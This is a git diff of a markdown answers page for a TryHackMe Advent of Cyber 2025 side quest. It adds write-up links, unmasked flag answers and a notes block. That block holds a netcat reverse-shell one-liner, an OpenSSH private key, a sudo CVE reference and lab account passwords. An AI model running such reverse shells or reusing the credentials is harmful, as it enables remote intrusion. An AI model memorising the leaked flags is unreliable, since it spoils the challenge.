@@ -184,6 +184,7 @@ https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX
 * [0xb0b Gitbook - Hoppers Origins](https://0xb0b.gitbook.io/writeups/tryhackme/2025/advent-of-cyber-25-side-quest/hoppers-origins)
 * [GitHub Invitation Code (Djalil Ayed)](https://github.com/djalilayed/tryhackme/tree/main/Advent_of_Cyber_Side_Quest_2025/Side_Quest_Keys/invitation_code)
 * [drouxinol github - Hoppers Origins](https://drouxinol.github.io/posts/tryhackme-aoc-2025-sq0/)
+* [id-root github - Hoppers Origins] https://github.com/id-root/Hoppers-Origin-Writeup
 
 ---
 
@@ -192,13 +193,13 @@ https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX
 ### YouTube Video Walk Through:
 
 * **Invitation Guide:** [Watch Video](https://www.youtube.com/watch?v=guQ3MQmkUTg)
-* **Hoppers Origins - Part 1 Walkthrough:** [Watch Video](https://www.youtube.com/watch?v=r1cUBw-G2kc)
+* **Hoppers Origins - Part 1 Walkthrough:** [Watch Video](https://www.youtube.com/watch?v=r1cUBw-G2kc) (DB // AI.VANCHAT.LOC )
 * **Hoppers Origins - Part 2 Walkthrough:** [Watch Video](https://www.youtube.com/watch?v=T-Hfx8VC7Nk)
 
 
 
 
-Answers Flag [in process]
+Answers Flag  
 DB: user.txt
 
 Answer format: `THM{114136cc-e9ab-4303-a825-18cb24d60d90}`
@@ -216,12 +217,12 @@ Answer format: `THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc}`
  
 TBFC.LOC: user.txt
 
-Answer format: `***{************************************}`
+Answer format: `THM{f3336b39-5601-40ea-a4d9-8b87cb4535a6}`
 
  
 TBFC.LOC: root.txt
 
-Answer format: `***{************************************}`
+Answer format: `THM{449d70b5-a212-45ca-a49b-037678f49569}`
 
  
 VANCHAT.LOC: user.txt
@@ -281,6 +282,42 @@ Answer format: `THM{82f9d06e-9a52-44d5-98c2-aef647805216}`
 Web: root.txt
 
 Answer format: `THM{583d5e19-4e61-47f1-b98e-5ece3b2d41db}`
+
+
+others info  
+ ```
+
+SOC_ADMIN_EXECUTE_COMMAND: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 4444 >/tmp/f
+ 
+
+ id_ed25519
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAELOYujt
+/vluUdyS/U7ZndAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGT9FlPyzrv+aUra
+DIDA8Q5nTOhHZ0IpHfpbQDIs/ph/AAAAoDMzy/jLhDwOxhUUP+1NiVFSG7XAdtc8fNeTPI
+XN6WKNqQD94nB1iOqzmN7g55slKuxmANcieQGkKYUibOiI16Hp+pOakUq16Vuj0PFZdKLe
+gMNn4lfTDF6EsNQOMP1oF7L8MJcpySn1qCWm1ocso0CHDgsD3Xj0dOTXaTYxehnupB0vJR
+FLHQ6nBC63Zb8VP9GxtfiSewAd+OkRPe8B/3c=
+-----END OPENSSH PRIVATE KEY-----
+
+ssh -v -i  id_rsa socbot3000@IP 
+password    (for soc bot) 
+ CVE for sudo  CVE-2025-32463
+
+ anne.clark@ai.vanchat.loc  Wbqs8193
+
+ qw2.amy.young@AI.VANCHAT.LOC password1!
+ AI\qw1.brian.singh:_4v41yVd$!DW
+ qw1.lucy.fry Password123!
+ qw1.martyn.jones Password123!
+ password in keepass adm_8XX8N5VBFprFfmFSdQ4soUM4
+  
+ rdp server 3 to 4 
+ TBFC-SQLServer1\AGI P@ssword123!
+ 
+``` 
+
+end 
 
 
 
